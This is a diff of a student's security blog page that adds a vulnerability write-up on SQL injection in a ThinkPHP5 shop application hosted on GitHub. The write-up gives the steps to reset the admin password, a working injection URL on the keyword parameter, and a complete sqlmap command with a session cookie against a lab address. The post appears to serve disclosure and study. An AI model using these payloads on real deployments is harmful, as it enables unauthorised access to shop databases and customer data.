@@ -2,7 +2,7 @@
 <html>
 	<head>
 		
-<title>文章归档-这里是一个普通学生的博客</title>
+<title>SUL1SS_shop_SQLi-这里是一个普通学生的博客</title>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
@@ -11,8 +11,9 @@
 <link rel="stylesheet" href="/css/index.css">
 
 
-<meta name="keywords" content="hexo主题,hexo扁平化主题,Quiet主题">
-<meta name="description" content="描述">
+
+<meta name="keywords" content="Vuln,">
+<meta name="description" content="">
 
 
 <script src="/js/jquery.min.js"></script>
@@ -38,9 +39,6 @@
 
 	<body>
 		
-
-    
-    
 	<div class="header">
 		<div class="header-top" id="header-top">
 			<div class="h-left">
@@ -61,13 +59,13 @@
 								
 									
 						
-							<li class="select">
-								<a href="/archives">
-									ARCHIVE
-								</a>
-								<span class="dot"></span>
-							</li>
-							
+								<li>
+									<a href="/archives">
+										ARCHIVE
+									</a>
+									<span class="dot"></span>
+								</li>
+								
 									
 						
 								<li>
@@ -278,64 +276,143 @@
 
 </script>
 
-    
-
-
-
-<div class="archive">
-    
-        <div class="header-body-background">
-    <div class="header-body-background-content">
-        <span>
-            <img src="/image/logo.png" alt="Quiet">
-        </span>
-
-        <h2>共有 5 篇文章</h2>
+<div class="post">
+    <div class="post-header-background post-header-color"
+    style="background: url('')" 
+>
+    <div class="post-header-background-content">
+        <ul class="post-header-tag">
+            
+            
+            <li><a href="/tags/Vuln">Vuln</a></li>
+            
+            
+        </ul>
+        
+        <h1>SUL1SS_shop_SQLi</h1>
+        <div class="post-header-info">
+            <div class="post-header-info-author">
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20">
+                        <g>
+                            <path fill="#12183A"
+                                d="M6.187 15.265A6.47 6.47 0 0 0 10 16.5a6.47 6.47 0 0 0 3.813-1.235A4.99 4.99 0 0 0 10 13.5a4.99 4.99 0 0 0-3.813 1.765zM5.082 14.25A6.485 6.485 0 0 1 10 12c1.965 0 3.726.872 4.918 2.25a6.5 6.5 0 1 0-9.836 0zM10 18a8 8 0 1 1 0-16 8 8 0 0 1 0 16zm0-7a3 3 0 1 1 0-6 3 3 0 0 1 0 6zm0-1.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3z">
+                            </path>
+                        </g>
+                    </svg>
+                
+                <span class="post-header-info-author-text"> <a href="../../about">Nokali</a></span>
+                <div class="post-header-info-author-categories">
+                    
+                </div>
+                <p>2023-03-04 18:50:34</p>
+            </div>
+        </div>
     </div>
 </div>
+    <div class="post-content" id="content">
+  
+  <div id="article" class="post-content-info">
     
-    <div class="archive-content" id="content">
-        <div class="archive-content-data">
-            <div class="grouping">
-    
-        <p>
-            2023
-        </p>
-        
-        <a href="/2023/03/04/SUL1SS-shop-SQLi/">
-            <span>SUL1SS_shop_SQLi</span>
-            <time>03-04</time>
-        </a>
-        
-        <a href="/2023/02/13/sqlmap基础反制/">
-            <span>sqlmap基础反制</span>
-            <time>02-13</time>
-        </a>
-        
-        <a href="/2023/02/11/ysoserial反制上线CS/">
-            <span>ysoserial反制上线CS</span>
-            <time>02-11</time>
-        </a>
-        
-        <a href="/2023/02/08/BurpSuite简单反制/">
-            <span>BurpSuite简单反制</span>
-            <time>02-08</time>
-        </a>
-        
-        <a href="/2023/02/08/2023-2-8/">
-            <span>一篇没什么意义的文章</span>
-            <time>02-08</time>
-        </a>
-        
-        
+
+    <h1 id="SQLi-Vulnerability-in-SUL1SS-shop"><a href="#SQLi-Vulnerability-in-SUL1SS-shop" class="headerlink" title="SQLi Vulnerability in SUL1SS_shop"></a>SQLi Vulnerability in SUL1SS_shop</h1><p><strong>Project:</strong> <a target="_blank" rel="noopener" href="https://github.com/617746883/thinkphp5.0_shop">https://github.com/617746883/thinkphp5.0_shop</a></p>
+<p>A shop application developed by ThinkPHP5</p>
+<p>Download and deploy in the web directory, and import the database file (install.sql)</p>
+<p><strong>Before starting,</strong> if you need to install the system, you may need to modify the database file (install.sql) to allow you to log in.</p>
+<pre><code>&#39;admin&#39;, &#39;f374baf63f70a5c2c4d172a0a6e37897&#39;, &#39;U66yPU04&#39;
+</code></pre>
+<p>modify it to</p>
+<pre><code>&#39;admin&#39;, &#39;a7da35830936caa0258da1c26c42d6ff&#39;, &#39;lVRVVp9g&#39;
+</code></pre>
+<p>In this way, the password becomes 123456, and you can <strong>start testing the vulnerability.</strong></p>
+<p>(Since this vulnerability exists in the background, it cannot be exploited if you do not know the password.)</p>
+<p>Visit and log in to the background, for example: <a target="_blank" rel="noopener" href="http://192.168.159.133:8080/index.php/admin/login/index.html">http://192.168.159.133:8080/index.php/admin/login/index.html</a></p>
+<p>Username:admin</p>
+<p>Password:123456</p>
+<p>Vulnerable file: <strong>application\merch\controller</strong></p>
+<p><img src="/2023/03/04/SUL1SS-shop-SQLi/code1.png" alt="code1"></p>
+<p>The <strong>$keyword</strong> variable is passed in by the GET method. When other variables meet the judgment conditions, it can finally be <strong>spliced into the SQL statement to cause SQL injection.</strong></p>
+<p><img src="/2023/03/04/SUL1SS-shop-SQLi/code2.png" alt="code2"></p>
+<p><img src="/2023/03/04/SUL1SS-shop-SQLi/code3.png" alt="code3"></p>
+<p>The resulting SQL statement is executed, resulting in blind injection.</p>
+<p><strong>Payload:</strong></p>
+<pre><code>http://192.168.159.133:8080/index.php/admin/order/olist_all.html?paytype=&amp;searchtime=&amp;time[start]=2023-02-04+15%3A02&amp;time[end]=2023-03-04+15%3A02&amp;searchfield=ordersn&amp;keyword=1%27&amp;export=0
+</code></pre>
+<p><strong>sqlmap payload(Replace the cookie with your own):</strong></p>
+<pre><code>sqlmap -u &quot;http://192.168.159.133:8080/index.php/admin/order/olist_all.html?paytype=&amp;searchtime=&amp;time%5Bstart%5D=2023-02-04+15%3A02&amp;time%5Bend%5D=2023-03-04+15%3A02&amp;searchfield=ordersn&amp;keyword=1*&amp;export=0&quot; --cookie=&quot;thinkphp_show_page_trace=0|0; login%40=60ae28k2vl20sg2gi9reljav61&quot; --current-user
+</code></pre>
+<p><img src="/2023/03/04/SUL1SS-shop-SQLi/payload.png" alt="payload"></p>
+
+  </div>
+  <div id=""></div>
 </div>
+
+<script>
+  
+Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
+  dragToClose: true,
+  Toolbar: true,
+  closeButton: "top",
+  Image: {
+    zoom: true,
+  },
+  on: {
+    initCarousel: (fancybox) => {
+      const slide = fancybox.Carousel.slides[fancybox.Carousel.page];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+    "Carousel.change": (fancybox, carousel, to, from) => {
+      const slide = carousel.slides[to];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+  },
+});
+</script>
+
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 9999;
+        /* width: 600px !important; */
+        min-width: 0%;
+        max-width: 90%;
+        max-height: 80%;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            max-width: 88%
+        }
+    }
+</style>
+
+    <div class="post-paging">
+    
+
+    
+    <a href="/2023/02/13/sqlmap%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%88%B6/">
+        <div class="post-paging-next">
+            <span>下一篇</span>
+            <p>sqlmap基础反制</p>
         </div>
-    </div>    
+    </a>
+    
 </div>
-
-
-
-
+</div>
 		
 <div class="footer">
 	<div class="Copyright">
